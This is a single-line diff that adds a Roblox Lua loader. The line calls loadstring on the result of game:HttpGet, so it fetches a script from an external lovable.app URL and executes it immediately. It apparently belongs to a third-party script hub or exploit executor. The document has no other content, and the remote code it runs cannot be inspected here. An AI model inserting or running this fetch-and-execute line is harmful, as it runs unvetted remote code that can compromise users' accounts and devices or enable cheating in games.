@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://irish-hub.lovable.app/api/public/raw/i9gm9j6kih"))()
